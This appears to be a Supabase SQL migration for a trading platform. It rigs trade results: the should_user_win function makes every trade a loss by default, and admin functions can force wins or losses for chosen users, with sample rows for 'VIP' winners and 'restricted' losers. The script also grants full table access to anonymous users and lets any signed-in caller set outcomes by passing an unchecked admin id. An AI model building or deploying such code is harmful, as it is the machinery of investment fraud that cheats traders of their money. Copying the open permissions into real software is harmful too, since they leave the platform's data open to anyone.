-- Corrected script to fix trade_outcomes table for LOSS by default behavior
-- Uses the correct public.users table structure with first_name and last_name
-- Run this in Supabase SQL Editor

-- First, check if the table exists and drop it to recreate with correct structure
DROP TABLE IF EXISTS public.trade_outcomes CASCADE;

-- Create the trade_outcomes table with the correct structure
CREATE TABLE public.trade_outcomes (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    user_id UUID NOT NULL REFERENCES auth.users(id) ON DELETE CASCADE,
    enabled BOOLEAN DEFAULT false,
    outcome_type TEXT NOT NULL CHECK (outcome_type = ANY (ARRAY['win'::text, 'loss'::text, 'default'::text])),
    spot_enabled BOOLEAN DEFAULT false,
    futures_enabled BOOLEAN DEFAULT false,
    options_enabled BOOLEAN DEFAULT false,
    arbitrage_enabled BOOLEAN DEFAULT false,
    description TEXT,
    priority INTEGER DEFAULT 100,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    updated_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    created_by UUID REFERENCES auth.users(id),
    updated_by UUID REFERENCES auth.users(id)
);

-- Create indexes
CREATE INDEX idx_trade_outcomes_user_id ON public.trade_outcomes(user_id);
CREATE INDEX idx_trade_outcomes_enabled ON public.trade_outcomes(enabled);
CREATE INDEX idx_trade_outcomes_priority ON public.trade_outcomes(priority, created_at);

-- Create trigger for updated_at
CREATE OR REPLACE FUNCTION update_updated_at_column()
RETURNS TRIGGER AS $$
BEGIN
    NEW.updated_at = CURRENT_TIMESTAMP;
    RETURN NEW;
END;
$$ language 'plpgsql';

CREATE TRIGGER update_trade_outcomes_updated_at
    BEFORE UPDATE ON public.trade_outcomes
    FOR EACH ROW
    EXECUTE FUNCTION update_updated_at_column();

-- Grant permissions
GRANT ALL ON public.trade_outcomes TO authenticated;
GRANT ALL ON public.trade_outcomes TO service_role;
GRANT ALL ON public.trade_outcomes TO anon;

-- Create a function to check if user should win (LOSS by default)
CREATE OR REPLACE FUNCTION should_user_win(p_user_id UUID, p_trade_type TEXT DEFAULT 'options')
RETURNS BOOLEAN LANGUAGE plpgsql SECURITY DEFINER AS $$
DECLARE
    v_enabled BOOLEAN;
    v_outcome_type TEXT;
    v_type_enabled BOOLEAN;
BEGIN
    -- Check if user has an active outcome
    SELECT enabled, outcome_type INTO v_enabled, v_outcome_type
    FROM trade_outcomes
    WHERE user_id = p_user_id
        AND enabled = true
        AND (
            (p_trade_type = 'spot' AND spot_enabled) OR
            (p_trade_type = 'futures' AND futures_enabled) OR
            (p_trade_type = 'options' AND options_enabled) OR
            (p_trade_type = 'arbitrage' AND arbitrage_enabled)
        )
    ORDER BY priority ASC, created_at DESC
    LIMIT 1;
    
    -- Return result based on outcome type
    IF v_enabled THEN
        CASE v_outcome_type
            WHEN 'win' THEN
                RETURN true; -- FORCE WIN
            WHEN 'loss' THEN
                RETURN false; -- FORCE LOSS
            WHEN 'default' THEN
                RETURN false; -- DEFAULT LOSS
        END CASE;
    END IF;
    
    -- Default: LOSS
    RETURN false;
END;
$$;

-- Grant execute permission
GRANT EXECUTE ON FUNCTION should_user_win TO authenticated;
GRANT EXECUTE ON FUNCTION should_user_win TO service_role;

-- Create a view to see active outcomes with user profile information
CREATE OR REPLACE VIEW active_trade_outcomes AS
SELECT 
    to2.*,
    u.email as user_email,
    u.first_name,
    u.last_name,
    u.status as user_status,
    u.kyc_status as user_kyc_status,
    u.account_type as user_account_type,
    u.is_admin as user_is_admin,
    u.admin_role as user_admin_role,
    CASE
        WHEN to2.outcome_type = 'win' THEN 'FORCE WIN'
        WHEN to2.outcome_type = 'loss' THEN 'FORCE LOSS'
        ELSE 'Default (LOSS)'
    END as outcome_label,
    CASE
        WHEN to2.spot_enabled AND to2.futures_enabled AND to2.options_enabled AND to2.arbitrage_enabled THEN 'All'
        WHEN to2.spot_enabled THEN 'Spot Only'
        WHEN to2.futures_enabled THEN 'Futures Only'
        WHEN to2.options_enabled THEN 'Options Only'
        WHEN to2.arbitrage_enabled THEN 'Arbitrage Only'
        ELSE 'Custom'
    END as enabled_types,
    CASE
        WHEN u.is_admin = true THEN 'Admin User'
        WHEN u.kyc_status = 'Verified' THEN 'Verified User'
        WHEN u.kyc_status = 'Pending' THEN 'Pending KYC'
        ELSE 'Unverified User'
    END as user_type_label
FROM trade_outcomes to2
LEFT JOIN public.users u ON u.id = to2.user_id
WHERE to2.enabled = true 
ORDER BY to2.priority ASC, to2.created_at DESC;

-- Grant access to the view
GRANT SELECT ON active_trade_outcomes TO authenticated;
GRANT SELECT ON active_trade_outcomes TO service_role;

-- Create a view for all trade outcomes (including inactive)
CREATE OR REPLACE VIEW all_trade_outcomes AS
SELECT 
    to2.*,
    u.email as user_email,
    u.first_name,
    u.last_name,
    u.status as user_status,
    u.kyc_status as user_kyc_status,
    u.account_type as user_account_type,
    u.is_admin as user_is_admin,
    u.admin_role as user_admin_role,
    CASE
        WHEN to2.outcome_type = 'win' THEN 'FORCE WIN'
        WHEN to2.outcome_type = 'loss' THEN 'FORCE LOSS'
        ELSE 'Default (LOSS)'
    END as outcome_label,
    CASE
        WHEN to2.spot_enabled AND to2.futures_enabled AND to2.options_enabled AND to2.arbitrage_enabled THEN 'All'
        WHEN to2.spot_enabled THEN 'Spot Only'
        WHEN to2.futures_enabled THEN 'Futures Only'
        WHEN to2.options_enabled THEN 'Options Only'
        WHEN to2.arbitrage_enabled THEN 'Arbitrage Only'
        ELSE 'Custom'
    END as enabled_types,
    CASE
        WHEN u.is_admin = true THEN 'Admin User'
        WHEN u.kyc_status = 'Verified' THEN 'Verified User'
        WHEN u.kyc_status = 'Pending' THEN 'Pending KYC'
        ELSE 'Unverified User'
    END as user_type_label,
    CASE
        WHEN to2.enabled = true THEN 'Active'
        ELSE 'Inactive'
    END as status_label
FROM trade_outcomes to2
LEFT JOIN public.users u ON u.id = to2.user_id
ORDER BY to2.priority ASC, to2.created_at DESC;

-- Grant access to the view
GRANT SELECT ON all_trade_outcomes TO authenticated;
GRANT SELECT ON all_trade_outcomes TO service_role;

-- Sample data for testing (replace USER_UUID_HERE with actual user UUID from public.users table)
-- Force WIN for a specific user (VIP user)
INSERT INTO public.trade_outcomes (
    user_id,
    enabled,
    outcome_type,
    spot_enabled,
    futures_enabled,
    options_enabled,
    arbitrage_enabled,
    description,
    priority,
    created_at,
    updated_at
) VALUES (
    'USER_UUID_HERE', -- Replace with actual user UUID from public.users
    true,
    'win',
    true,
    true,
    true,
    true,
    'VIP user - Force WIN enabled',
    1,
    NOW(),
    NOW()
);

-- Force LOSS for a specific user (restricted user)
INSERT INTO public.trade_outcomes (
    user_id,
    enabled,
    outcome_type,
    spot_enabled,
    futures_enabled,
    options_enabled,
    arbitrage_enabled,
    description,
    priority,
    created_at,
    updated_at
) VALUES (
    'USER_UUID_HERE', -- Replace with actual user UUID from public.users
    true,
    'loss',
    true,
    true,
    true,
    true,
    'Restricted user - Force LOSS enabled',
    1,
    NOW(),
    NOW()
);

-- Options-only force WIN user
INSERT INTO public.trade_outcomes (
    user_id,
    enabled,
    outcome_type,
    spot_enabled,
    futures_enabled,
    options_enabled,
    arbitrage_enabled,
    description,
    priority,
    created_at,
    updated_at
) VALUES (
    'USER_UUID_HERE', -- Replace with actual user UUID from public.users
    true,
    'win',
    false,
    false,
    true,
    false,
    'Options trading only - Force WIN',
    1,
    NOW(),
    NOW()
);

-- Create a simple function to test the system
CREATE OR REPLACE FUNCTION test_user_outcome(p_user_id UUID, p_trade_type TEXT DEFAULT 'options')
RETURNS TABLE (
    should_win boolean,
    outcome_label TEXT,
    outcome_type TEXT,
    user_email TEXT,
    user_first_name TEXT,
    user_last_name TEXT
) LANGUAGE plpgsql SECURITY DEFINER AS $$
BEGIN
    RETURN QUERY
    SELECT 
        should_user_win(p_user_id, p_trade_type) as should_win,
        CASE 
            WHEN should_user_win(p_user_id, p_trade_type) THEN 'WIN (Admin Forced)'
            ELSE 'LOSS (Default)'
        END as outcome_label,
        CASE 
            WHEN should_user_win(p_user_id, p_trade_type) THEN 'win'
            ELSE 'loss'
        END as outcome_type,
        u.email,
        u.first_name,
        u.last_name
    FROM public.users u
    WHERE u.id = p_user_id;
END;
$$;

-- Grant execute permission for testing
GRANT EXECUTE ON FUNCTION test_user_outcome TO authenticated;
GRANT EXECUTE ON FUNCTION test_user_outcome TO service_role;

-- Create a function to get user outcome with details
CREATE OR REPLACE FUNCTION get_user_outcome_details(p_user_id UUID, p_trade_type TEXT DEFAULT 'options')
RETURNS TABLE (
    should_win boolean,
    outcome_source TEXT,
    outcome_type TEXT,
    user_email TEXT,
    user_first_name TEXT,
    user_last_name TEXT,
    user_status TEXT,
    user_kyc_status TEXT,
    user_is_admin BOOLEAN,
    user_account_type TEXT,
    admin_description TEXT
) LANGUAGE plpgsql SECURITY DEFINER AS $$
DECLARE
    v_enabled BOOLEAN;
    v_outcome_type TEXT;
    v_type_enabled BOOLEAN;
    v_admin_desc TEXT;
BEGIN
    -- Check if user has an active outcome
    SELECT enabled, outcome_type INTO v_enabled, v_outcome_type
    FROM trade_outcomes
    WHERE user_id = p_user_id
        AND enabled = true
        AND (
            (p_trade_type = 'spot' AND spot_enabled) OR
            (p_trade_type = 'futures' AND futures_enabled) OR
            (p_trade_type = 'options' AND options_enabled) OR
            (p_trade_type = 'arbitrage' AND arbitrage_enabled)
        )
    ORDER BY priority ASC, created_at DESC
    LIMIT 1;
    
    -- Build admin description
    IF v_enabled THEN
        CASE v_outcome_type
            WHEN 'win' THEN
                v_admin_desc := 'Admin forced WIN for ' || p_trade_type || ' trading';
            WHEN 'loss' THEN
                v_admin_desc := 'Admin forced LOSS for ' || p_trade_type || ' trading';
            WHEN 'default' THEN
                v_admin_desc := 'Admin set to default (LOSS) for ' || p_trade_type || ' trading';
        END CASE;
    ELSE
        v_admin_desc := 'No admin intervention - Default LOSS behavior for ' || p_trade_type || ' trading';
    END IF;
    
    -- Return result based on outcome type
    RETURN QUERY
    SELECT 
        CASE 
            WHEN v_enabled THEN
                CASE v_outcome_type
                    WHEN 'win' THEN true
                    WHEN 'loss' THEN false
                    ELSE false
                END
            ELSE false
        END as should_win,
        CASE 
            WHEN v_enabled THEN 'user_force'
            ELSE 'default_loss'
        END as outcome_source,
        COALESCE(v_outcome_type, 'default') as outcome_type,
        u.email,
        u.first_name,
        u.last_name,
        u.status,
        u.kyc_status,
        u.is_admin,
        u.account_type,
        v_admin_desc
    FROM public.users u
    WHERE u.id = p_user_id;
END;
$$;

-- Grant execute permission
GRANT EXECUTE ON FUNCTION get_user_outcome_details TO authenticated;
GRANT EXECUTE ON FUNCTION get_user_outcome_details TO service_role;

-- Create a function for admins to set user outcomes
CREATE OR REPLACE FUNCTION set_user_outcome(
    p_admin_id UUID,
    p_target_user_id UUID,
    p_outcome_type TEXT,
    p_enabled BOOLEAN DEFAULT true,
    p_spot_enabled BOOLEAN DEFAULT false,
    p_futures_enabled BOOLEAN DEFAULT false,
    p_options_enabled BOOLEAN DEFAULT false,
    p_arbitrage_enabled BOOLEAN DEFAULT false,
    p_description TEXT DEFAULT NULL
)
RETURNS TEXT LANGUAGE plpgsql SECURITY DEFINER AS $$
DECLARE
    v_admin_email TEXT;
    v_target_email TEXT;
    v_existing_id UUID;
BEGIN
    -- Get admin email for logging
    SELECT email INTO v_admin_email FROM public.users WHERE id = p_admin_id;
    
    -- Get target user email for logging
    SELECT email INTO v_target_email FROM public.users WHERE id = p_target_user_id;
    
    -- Check if outcome already exists
    SELECT id INTO v_existing_id FROM trade_outcomes 
    WHERE user_id = p_target_user_id LIMIT 1;
    
    IF v_existing_id IS NOT NULL THEN
        -- Update existing outcome
        UPDATE trade_outcomes SET
            outcome_type = p_outcome_type,
            enabled = p_enabled,
            spot_enabled = p_spot_enabled,
            futures_enabled = p_futures_enabled,
            options_enabled = p_options_enabled,
            arbitrage_enabled = p_arbitrage_enabled,
            description = p_description,
            updated_at = NOW(),
            updated_by = p_admin_id
        WHERE id = v_existing_id;
        
        RETURN 'Updated outcome for user ' || v_target_email || ' to ' || p_outcome_type || ' by admin ' || v_admin_email;
    ELSE
        -- Insert new outcome
        INSERT INTO trade_outcomes (
            user_id,
            outcome_type,
            enabled,
            spot_enabled,
            futures_enabled,
            options_enabled,
            arbitrage_enabled,
            description,
            priority,
            created_at,
            updated_at,
            created_by,
            updated_by
        ) VALUES (
            p_target_user_id,
            p_outcome_type,
            p_enabled,
            p_spot_enabled,
            p_futures_enabled,
            p_options_enabled,
            p_arbitrage_enabled,
            p_description,
            100,
            NOW(),
            NOW(),
            p_admin_id,
            p_admin_id
        );
        
        RETURN 'Created new ' || p_outcome_type || ' outcome for user ' || v_target_email || ' by admin ' || v_admin_email;
    END IF;
END;
$$;

-- Grant execute permission
GRANT EXECUTE ON FUNCTION set_user_outcome TO authenticated;
GRANT EXECUTE ON FUNCTION set_user_outcome TO service_role;

-- Create a function for admins to disable user outcomes
CREATE OR REPLACE FUNCTION disable_user_outcome(
    p_admin_id UUID,
    p_target_user_id UUID
)
RETURNS TEXT LANGUAGE plpgsql SECURITY DEFINER AS $$
DECLARE
    v_admin_email TEXT;
    v_target_email TEXT;
BEGIN
    -- Get admin email for logging
    SELECT email INTO v_admin_email FROM public.users WHERE id = p_admin_id;
    
    -- Get target user email for logging
    SELECT email INTO v_target_email FROM public.users WHERE id = p_target_user_id;
    
    -- Disable the outcome
    UPDATE trade_outcomes SET
        enabled = false,
        updated_at = NOW(),
        updated_by = p_admin_id,
        description = COALESCE(description, '') || ' [DISABLED by admin ' || v_admin_email || ' at ' || NOW()::text || ']'
    WHERE user_id = p_target_user_id;
    
    RETURN 'Disabled outcome for user ' || v_target_email || ' by admin ' || v_admin_email;
END;
$$;

-- Grant execute permission
GRANT EXECUTE ON FUNCTION disable_user_outcome TO authenticated;
GRANT EXECUTE ON FUNCTION disable_user_outcome TO service_role;

COMMIT;
